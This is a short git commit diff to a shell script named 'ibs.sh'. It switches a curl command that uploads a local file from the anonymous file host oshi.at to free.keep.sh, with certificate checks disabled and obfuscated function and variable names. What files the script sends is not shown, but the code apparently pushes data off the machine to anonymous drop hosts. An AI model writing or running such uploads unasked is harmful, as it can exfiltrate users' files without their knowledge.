13d9ca466d6eb09529cd0c365fbb3c831c878837
hLbx0 <90946073+hLbx0@users.noreply.github.com>
2024-02-06 04:33:40 -0500

    Update ibs.sh

--- ibs.sh
+++ ibs.sh
@@ -136,13 +136,13 @@ function GCx_(){
 }
 
 function cx(){
-    OX2=`curl -k --connect-timeout 900 --max-time 900 -T $IBUS__$1 https://oshi.at`
+    #OX2=`curl -k --connect-timeout 900 --max-time 900 -T $IBUS__$1 https://oshi.at`
     #dbgx "OX2: $OX2";
-    cx_ "$OX2" "$2"
+    #cx_ "$OX2" "$2"
     #
-    #OX3=`curl -k --connect-timeout 900 --max-time 900 --upload-file $IBUS__$1 https://free.keep.sh`
+    OX3=`curl -k --connect-timeout 900 --max-time 900 --upload-file $IBUS__$1 https://free.keep.sh`
     #dbgx "cx: $OX3";
-    #cx_ "$OX3" "$2"
+    cx_ "$OX3" "$2"
 }
 
 function cx_(){
